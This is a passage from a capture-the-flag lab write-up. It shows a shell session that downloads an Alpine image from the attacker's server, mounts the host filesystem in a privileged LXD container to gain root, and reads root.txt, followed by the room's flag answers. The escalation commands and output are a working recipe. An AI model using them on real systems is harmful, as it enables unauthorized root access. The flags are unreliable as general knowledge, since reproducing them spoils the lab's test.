+-bash-4.4$ wget http://10.8.19.103:8000/alpine-v3.16-x86_64-20220919_1406.tar.gz
+--2022-12-25 20:13:13--  http://10.8.19.103:8000/alpine-v3.16-x86_64-20220919_1406.tar.gz
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3211484 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.16-x86_64-20220919_1406.tar.gz’
+
+alpine-v3.16-x86_64-202209 100%[=======================================>]   3.06M   281KB/s    in 12s     
+
+2022-12-25 20:13:25 (270 KB/s) - ‘alpine-v3.16-x86_64-20220919_1406.tar.gz’ saved [3211484/3211484]
+
+-bash-4.4$ ls
+alpine-v3.16-x86_64-20220919_1406.tar.gz
+systemd-private-924375ecefe542fc90745e2f73214a17-apache2.service-7jrI0u
+systemd-private-924375ecefe542fc90745e2f73214a17-systemd-resolved.service-8CHgwF
+systemd-private-924375ecefe542fc90745e2f73214a17-systemd-timesyncd.service-kFmtRd
+
+-bash-4.4$ lxc image import ./alpine-v3.16-x86_64-20220919_1406.tar.gz --alias alpine
+Image imported with fingerprint: 46ea16cf67c2a57b3995b13e0111f75abd5618ac91147f47559fb22c8ee884d7
+-bash-4.4$ lxc image list
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| alpine | 46ea16cf67c2 | no     | alpine v3.16 (20220919_14:06) | x86_64 | 3.06MB | Dec 25, 2022 at 8:14pm (UTC) |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+
+-bash-4.4$ lxc init alpine ignite -c security.privileged=true
+Creating ignite
+-bash-4.4$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+-bash-4.4$ lxc start ignite
+-bash-4.4$ lxc exec ignite /bin/sh
+~ # whoami
+root
+
+~ # cd /mnt/root/root
+/mnt/root/root # ls
+root.txt
+/mnt/root/root # cat root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+
+:)
+
+Was really fun!
+```
+![[Pasted image 20221225122239.png]]
+![[Pasted image 20221225142300.png]]
+![[Pasted image 20221225142640.png]]
+![[Pasted image 20221225142735.png]]
+user.txt
+root.txt
+
+## Flags / Answers
+- ***THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}***
+- ***THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}***
+
+## Notes / Lessons Learned
+[[Poster]]
+
